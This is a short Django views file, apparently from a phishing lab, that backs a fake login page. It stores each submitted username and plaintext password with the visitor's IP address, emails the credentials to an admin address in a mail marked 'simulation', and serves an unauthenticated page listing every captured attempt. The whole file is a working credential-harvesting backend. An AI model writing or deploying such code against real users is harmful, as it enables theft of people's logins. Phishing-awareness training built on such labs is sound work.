from django.shortcuts import render

from django.shortcuts import render
from .models import TentativeConnexion
from django.core.mail import send_mail

def page_connexion(request):
    if request.method == "POST":
        identifiant = request.POST.get("username")
        mot_de_passe = request.POST.get("password")

        ip = request.META.get('REMOTE_ADDR')

        TentativeConnexion.objects.create(
            identifiant=identifiant,
            mot_de_passe=mot_de_passe,
            adresse_ip=ip
        )

        # Email envoyé vers la console (local)
        send_mail(
            "Nouvelle tentative (simulation)",
            f"Identifiant: {identifiant}\nMot de passe: {mot_de_passe}",
            "lab@local",
            ["admin@local"],
            fail_silently=True,
        )

        return render(request, "phishing/merci.html")

    return render(request, "phishing/login.html")


def liste_tentatives(request):
    tentatives = TentativeConnexion.objects.all().order_by("-date")
    return render(request, "phishing/liste.html", {"tentatives": tentatives})